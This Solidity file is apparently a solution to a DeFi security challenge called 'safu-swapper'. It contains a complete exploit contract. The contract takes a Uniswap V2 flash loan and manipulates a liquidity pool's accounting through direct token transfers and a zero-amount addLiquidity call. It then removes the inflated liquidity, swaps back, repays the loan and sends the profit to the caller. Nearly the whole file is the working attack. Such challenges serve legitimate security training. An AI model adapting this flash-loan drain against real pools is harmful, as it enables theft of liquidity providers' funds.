// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {Token} from "src/other/Token.sol";
import {SafuUtils} from "src/safu-swapper/SafuUtils.sol";
import {SafuPool} from "src/safu-swapper/SafuPool.sol";

contract SafuSwapperAttack {
    IUniswapV2Pair public uniPair;
    Token public usdc;
    Token public safu;
    SafuPool public safuPool;

    constructor(IUniswapV2Pair _uniPair, Token _usdc, Token _safu, SafuPool _safuPool) {
        uniPair = _uniPair;
        usdc = _usdc;
        safu = _safu;
        safuPool = _safuPool;
    }

    function attack() public {
        uint256 flashAmount = usdc.balanceOf(address(uniPair)) - 1;
        uniPair.swap({amount0Out: flashAmount, amount1Out: 0, to: address(this), data: "flash"});

        uint256 attackerAmount = usdc.balanceOf(address(this));
        usdc.transfer({to: msg.sender, amount: attackerAmount});
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        // approve tokens for transfer
        safu.approve({spender: address(safuPool), amount: type(uint256).max});
        usdc.approve({spender: address(safuPool), amount: type(uint256).max});

        // swap some USDC to get SAFU
        for (uint256 i; i < 5; i++) {
            safuPool.swap({toToken: address(safu), amount: 10_000e18});
        }

        console.log("-- after 1st swap");
        console.log("baseAmount ", safuPool.baseAmount());
        console.log("tokenAmount", safuPool.tokenAmount());

        uint256 safuBalance = safu.balanceOf(address(this));

        safuPool.addLiquidity({_baseAmount: safuBalance, _tokenAmount: safuBalance});

        console.log("-- after adding liquidity");
        console.log("baseAmount ", safuPool.baseAmount());
        console.log("tokenAmount", safuPool.tokenAmount());

        for (uint256 i; i < 5; i++) {
            safuPool.swap({toToken: address(safu), amount: 10_000e18});
        }

        console.log("-- after 2st swap");
        console.log("baseAmount ", safuPool.baseAmount());
        console.log("tokenAmount", safuPool.tokenAmount());
        console.log("SAFU balance", safu.balanceOf(address(safuPool)));
        console.log("USDC balance", usdc.balanceOf(address(safuPool)));

        safuBalance = safu.balanceOf(address(this));
        console.log("SAFUBALANCE*3", safuBalance * 3);
        uint256 usdcBalance = usdc.balanceOf(address(this));
        console.log("usdcBalance", usdcBalance / 2);

        safu.transfer({to: address(safuPool), amount: safuBalance});
        usdc.transfer({to: address(safuPool), amount: 600_000e18});

        console.log("-- after transferring SAFU and USDC directly to safuPool");
        console.log("baseAmount ", safuPool.baseAmount());
        console.log("tokenAmount", safuPool.tokenAmount());
        console.log("SAFU balance", safu.balanceOf(address(safuPool)));
        console.log("USDC balance", usdc.balanceOf(address(safuPool)));

        safuPool.removeAllLiquidity();

        console.log("-- after removing liquidity");
        console.log("baseAmount ", safuPool.baseAmount());
        console.log("tokenAmount", safuPool.tokenAmount());
        console.log("SAFU balance", safu.balanceOf(address(safuPool)));
        console.log("USDC balance", usdc.balanceOf(address(safuPool)));

        safuPool.addLiquidity({_baseAmount: 0, _tokenAmount: 0}); // this `addLiquidity` call counts the direct transfers

        console.log("-- after adding zero liquidity");
        console.log("baseAmount ", safuPool.baseAmount());
        console.log("tokenAmount", safuPool.tokenAmount());
        console.log("SAFU balance", safu.balanceOf(address(safuPool)));
        console.log("USDC balance", usdc.balanceOf(address(safuPool)));

        safuPool.removeAllLiquidity();

        console.log("-- after removing liquidity again");
        console.log("baseAmount ", safuPool.baseAmount());
        console.log("tokenAmount", safuPool.tokenAmount());
        console.log("SAFU balance", safu.balanceOf(address(safuPool)));
        console.log("USDC balance", usdc.balanceOf(address(safuPool)));

        safuBalance = safu.balanceOf(address(this)) / 15;

        for (uint256 i; i < 10; i++) {
            safuPool.swap({toToken: address(usdc), amount: safuBalance});
        }

        uint256 loanPlusInterest = (amount0 * (10 ** 18) * 1000 / 997 / (10 ** 18)) + 1;
        usdc.transfer({to: address(uniPair), amount: loanPlusInterest});
    }
}
